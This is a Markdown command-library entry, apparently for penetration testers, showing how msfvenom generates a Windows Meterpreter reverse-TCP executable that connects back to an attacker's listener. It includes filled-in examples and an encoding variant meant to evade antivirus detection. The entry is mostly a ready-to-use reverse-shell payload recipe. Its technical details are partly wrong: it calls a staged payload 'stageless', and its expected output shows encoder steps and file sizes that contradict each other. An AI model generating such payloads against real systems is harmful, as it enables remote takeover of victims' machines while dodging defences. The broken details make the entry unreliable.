---
type: command
executor: bash
data: >-
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$_ATTACKER_IP
  LPORT=$_LISTEN_PORT -f exe > windows_meterpreter_reverse.exe
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
tags:
  - payload-generation
  - meterpreter
  - reverse-tcp
verified: true
validated: true
---

# msfvenom-generate-windows-meterpreter-reverse-tcp

## Command

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_LISTEN_PORT -f exe > windows_meterpreter_reverse.exe
```

## Description

This command uses msfvenom from the Metasploit Framework to generate a stageless Windows Meterpreter reverse TCP payload as an executable file. It is used during penetration testing to create a payload that connects back to the attacker's listener, providing an advanced shell for post-exploitation. Run this on a system with Metasploit installed, typically Kali Linux.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p windows/meterpreter/reverse_tcp | Specifies the payload type: a Meterpreter reverse TCP shell for Windows | Yes |
| LHOST=$_ATTACKER_IP | IP address of the attacker's listener machine | Yes |
| LPORT=$_LISTEN_PORT | Port on which the listener is running (e.g., 4444) | Yes |
| -f exe | Output format as a Windows executable | Yes |
| > windows_meterpreter_reverse.exe | Redirects output to the named executable file | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe
```

### Advanced Usage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 3 > encoded_shell.exe
```

This adds encoding (-e) with three iterations (-i 3) to evade basic AV detection.

## Expected Output

The command produces no verbose stdout but creates the executable file. Successful generation shows:

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 355.00 bytes (738.00 bytes decreased)
Payload size: 738 bytes
Final size of exe file: 738 bytes
Saved payload to: windows_meterpreter_reverse.exe
```

Verify with `file windows_meterpreter_reverse.exe` (should show PE32 executable for Windows).

## Related

- [[procedures/Generate-Windows-Meterpreter-Reverse-TCP-Payload]]
- [[tools/Metasploit Framework]]
